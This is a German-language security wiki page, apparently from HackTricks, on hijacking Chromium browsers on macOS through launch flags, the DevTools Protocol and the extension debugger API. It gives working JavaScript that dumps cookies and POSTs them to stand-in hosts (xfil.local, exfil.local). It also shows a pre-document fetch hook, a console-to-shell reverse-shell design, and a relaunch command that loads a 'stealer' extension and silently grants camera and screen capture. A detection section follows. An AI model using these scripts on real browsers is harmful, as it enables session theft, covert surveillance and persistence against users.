# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Chromium-basierte Browser wie Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi und Opera verwenden dieselben command-line switches, Preference-Dateien und DevTools-Automatisierungsinterfaces. Unter macOS kann jeder Benutzer mit GUI-Zugriff eine bestehende Browsersitzung beenden und sie mit beliebigen Flags, Extensions oder DevTools-Endpunkten erneut öffnen, die mit den Entitlements des Ziels ausgeführt werden.

#### Chromium mit benutzerdefinierten Flags unter macOS starten

macOS verwendet pro Chromium-Profil nur eine einzelne UI-Instanz. Daher muss der Browser für Instrumentierung normalerweise zwangsweise geschlossen werden, beispielsweise mit `osascript -e 'tell application "Google Chrome" to quit'`. Angreifer starten ihn typischerweise über `open -na "Google Chrome" --args <flags>` neu, um Argumente einzuschleusen, ohne das App-Bundle zu verändern. Wird dieser Befehl in einen Benutzer-LaunchAgent (`~/Library/LaunchAgents/*.plist`) oder einen Login-Hook eingebettet, wird sichergestellt, dass der manipulierte Browser nach einem Neustart oder Abmelden erneut gestartet wird.

#### `--load-extension` Flag

Das `--load-extension` Flag lädt automatisch nicht gepackte Extensions aus angegebenen Pfaden (durch Kommas getrennt). Zusammen mit `--disable-extensions-except` können legitime Extensions blockiert und ausschließlich die eigene Payload ausgeführt werden. Malicious Extensions können weitreichende Berechtigungen wie `debugger`, `webRequest` und `cookies` anfordern, um auf DevTools-Protokolle zuzugreifen, CSP-Header zu verändern, HTTPS herabzustufen oder Session-Material unmittelbar nach dem Browserstart zu exfiltrieren.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Diese Switches stellen das Chrome DevTools Protocol (CDP) über TCP oder eine Pipe bereit, sodass externe Tools den Browser steuern können. Google beobachtete eine weitverbreitete Infostealer-Ausnutzung dieser Schnittstelle. Seit Chrome 136 (März 2025) werden die Switches für das Default-Profil ignoriert, sofern der Browser nicht mit einem nicht standardmäßigen `--user-data-dir` gestartet wird. Dadurch wird App-Bound Encryption für echte Profile erzwungen. Angreifer können jedoch weiterhin ein neues Profil starten, das Opfer dazu bringen, sich darin zu authentifizieren (Phishing/triage assistance), und über CDP Cookies, Tokens, Device-Trust-Status oder WebAuthn-Registrierungen abgreifen.

#### `--user-data-dir` Flag

Dieses Flag leitet das gesamte Browserprofil (History, Cookies, Login Data, Preference-Dateien usw.) an einen von Angreifern kontrollierten Pfad um. Es ist erforderlich, wenn moderne Chrome-Builds mit `--remote-debugging-port` kombiniert werden. Außerdem hält es das manipulierte Profil isoliert, sodass vorab gefüllte `Preferences`- oder `Secure Preferences`-Dateien abgelegt werden können, die Sicherheitshinweise deaktivieren, Extensions automatisch installieren und Standardschemata ändern.

#### `--use-fake-ui-for-media-stream` Flag

Dieser Switch umgeht den Berechtigungsdialog für Kamera und Mikrofon, sodass jede Seite, die `getUserMedia` aufruft, sofort Zugriff erhält. In Kombination mit Flags wie `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` oder CDP-`Browser.grantPermissions`-Befehlen können Audio- und Videoaufnahmen sowie Desktop-Freigaben stillschweigend durchgeführt oder WebRTC-Berechtigungsprüfungen ohne Benutzerinteraktion erfüllt werden.

## In the Wild beobachtete Delivery- und Relaunch-Muster

CDP abuse ist häufig eine **post-exploitation**-Phase und nicht die initiale Payload. Eine aktuelle, auf macOS-Entwickler abzielende Kampagne verwendete eine manipulierte Xcode-**`Run Script` build phase** (`PBXShellScriptBuildPhase`), sodass der Code nur ausgeführt wurde, wenn das Opfer das Projekt **buildete**, nicht bereits beim bloßen Klonen oder Öffnen. Nach dieser ersten Ausführung infizierte die Malware außerdem weitere `.xcodeproj`-Verzeichnisse, fügte schädliche Git-`pre-commit`-Hooks hinzu und durchsuchte ZIP-Archive nach weiteren Xcode-Projekten.

Für Chromium abuse ist das relevant, weil der Angreifer nicht die Browser-Binary selbst patchen muss. Ein kurzlebiger Build-Phase-/`osascript`-Stager kann stattdessen einen **Browser wrapper** (LaunchAgent, Login Item, Dock-Eintrag, trojanisierter App-Launcher usw.) installieren, der den legitimen Browser jedes Mal mit von Angreifern kontrollierten Flags erneut öffnet, sobald der Benutzer ihn startet.

> [!TIP]
> Untersuche auf Entwickler-Endpunkten `.pbxproj`-Dateien, `.git/hooks/pre-commit` und ZIPs mit `.xcodeproj` auf unerwartete `curl`-, `osascript`-, `xxd`-, verschachtelte `base64`- oder Chrome-Relaunch-Logik.

## Ausnutzung von Remote Debugging und DevTools Protocol

Sobald Chrome mit einem dedizierten `--user-data-dir` und `--remote-debugging-port` erneut gestartet wurde, kann über CDP eine Verbindung hergestellt werden (z. B. mit `chrome-remote-interface`, `puppeteer` oder `playwright`), um Workflows mit hohen Berechtigungen zu automatisieren:

- **Cookie-/Session-Diebstahl:** `Network.getAllCookies` und `Storage.getCookies` geben auch HttpOnly-Werte zurück, selbst wenn App-Bound Encryption normalerweise den Dateisystemzugriff blockieren würde, da CDP den laufenden Browser auffordert, sie zu entschlüsseln.
- **Manipulation von Berechtigungen:** `Browser.grantPermissions` und `Emulation.setGeolocationOverride` ermöglichen das Umgehen von Kamera-/Mikrofonabfragen (insbesondere in Kombination mit `--use-fake-ui-for-media-stream`) oder das Fälschen standortbasierter Sicherheitsprüfungen.
- **Keystroke-/Script-Injection:** `Runtime.evaluate` führt beliebiges JavaScript im aktiven Tab aus und ermöglicht das Abgreifen von Zugangsdaten, das Patchen des DOM oder das Einschleusen von Persistence-Beacons, die Navigationen überstehen.
- **Live-Exfiltration:** `Network.webRequestWillBeSentExtraInfo` und `Fetch.enable` fangen authentifizierte Requests/Responses in Echtzeit ab, ohne Artefakte auf der Festplatte zu hinterlassen.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Da Chrome 136 CDP im Standardprofil blockiert, liefert das Kopieren des vorhandenen Verzeichnisses `~/Library/Application Support/Google/Chrome` des Opfers in einen staging path keine entschlüsselten Cookies mehr. Stattdessen sollte der Benutzer dazu gebracht werden, sich innerhalb des instrumentierten Profils zu authentifizieren (z. B. während einer „hilfreichen“ support session), oder MFA tokens sollten über CDP-controlled network hooks während der Übertragung erfasst werden.

### XCSSET-style CDP Backdoor Chain

Ein praktisches Malware-Muster ist:

1. Den userland implant oder wrapper bei jedem Start von Chrome neu starten.
2. Den legitimen Browser mit `--remote-debugging-port=<port>` und ab Chrome 136+ in der Regel zusätzlich mit einem nicht standardmäßigen `--user-data-dir=<dir>` starten.
3. Einen helper starten, der sich mit dem lokalen CDP WebSocket verbindet und über `Page.addScriptToEvaluateOnNewDocument` einen pre-document hook registriert.

Dieser helper kann JavaScript **vor** der Ausführung des site code injizieren. Das eignet sich ideal zum Hooking von `window.fetch`, `XMLHttpRequest`, wallet providers oder autofill flows, ohne Dateien auf der Festplatte zu patchen.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Eine stärkere Variante verwandelt den Browser in eine **host command bridge**: Injiziertes JavaScript gibt ein mit einem Marker versehenes `console.log` aus, der lokale Helper überwacht `Runtime.consoleAPICalled`, entfernt den Marker, führt den Rest über die Host-Shell aus (zum Beispiel mit Go's `exec.Command`) und gibt stdout/stderr über den WebSocket des Angreifers zurück. Dadurch wird die Script-Ausführung auf Tab-Ebene zu einer größtenteils fileless reverse shell.

## Injection über Extensions mittels Debugger API

Die Forschungsarbeit „Chrowned by an Extension“ aus dem Jahr 2023 zeigte, dass eine bösartige Extension mit der `chrome.debugger` API sich an jeden Tab anhängen und dieselben DevTools-Berechtigungen wie `--remote-debugging-port` erlangen kann. Dadurch werden die ursprünglichen Isolationsannahmen gebrochen (Extensions bleiben in ihrem eigenen Kontext), und Folgendes wird ermöglicht:

- Unauffälliger Diebstahl von Cookies und Credentials mit `Network.getAllCookies`/`Fetch.getResponseBody`.
- Änderung von Site-Berechtigungen (Kamera, Mikrofon, Geolocation) und Umgehung von Security-Interstitials, wodurch Phishing-Seiten Chrome-Dialoge imitieren können.
- Manipulation von TLS-Warnungen, Downloads oder WebAuthn-Prompts auf dem Übertragungsweg durch programmgesteuerte Verwendung von `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` oder `Security.handleCertificateError`.

Lade die Extension mit `--load-extension`/`--disable-extensions-except`, sodass keine Interaktion des Benutzers erforderlich ist. Ein minimales Background-Script, das die API für diesen Zweck missbraucht, sieht so aus:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Die Erweiterung kann sich außerdem für `Debugger.paused`-Events registrieren, um JavaScript-Variablen zu lesen, Inline-Skripte zu patchen oder eigene Breakpoints zu setzen, die eine Navigation überdauern. Da alles innerhalb der GUI-Sitzung des Benutzers ausgeführt wird, werden Gatekeeper und TCC nicht ausgelöst. Dadurch eignet sich diese Technik ideal für Malware, die bereits eine Ausführung im Benutzerkontext erreicht hat.

## Erkennung & Hunting

- Alarmieren, wenn Chromium-Browser mit `--remote-debugging-port`, `--remote-debugging-pipe` oder einem verdächtigen `--user-data-dir` gestartet werden, insbesondere wenn der übergeordnete Prozess `bash`, `sh`, `osascript`, `xcodebuild` oder ein LaunchAgent-Helfer ist.
- Nach kurzen Ketten suchen, in denen ein Helfer einen lokalen CDP-WebSocket öffnet, `Page.addScriptToEvaluateOnNewDocument` registriert und anschließend eine langlebige ausgehende WebSocket-/HTTPS-Verbindung herstellt.
- Nach Console-to-Shell-Bridges suchen, indem Browseraktivitäten mit `Runtime.consoleAPICalled` mit untergeordneten Shells oder Helferprozessen korreliert werden, die vom Angreifer bereitgestellte Befehle ausführen.
- Auf Entwickler-Macs `.pbxproj`-Einträge vom Typ `PBXShellScriptBuildPhase`, Git-`pre-commit`-Hooks, Dock-/Login-Item-Neustarter und ZIP-Archive mit enthaltenen Xcode-Projekten auf die Installation von Browser-Wrappern überprüfen.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatisiert Chromium-Starts mit Payload-Erweiterungen und stellt interaktive CDP-Hooks bereit.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Ähnliche Tools mit Fokus auf Traffic-Interception und Browser-Instrumentierung für macOS-Operatoren.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js-Bibliothek zum Scripting von Chrome-DevTools-Protocol-Dumps (Cookies, DOM, Berechtigungen), sobald eine Instanz mit `--remote-debugging-port` aktiv ist.

### Example
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Weitere Beispiele finden Sie in den Links zu den Tools.

## Referenzen

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
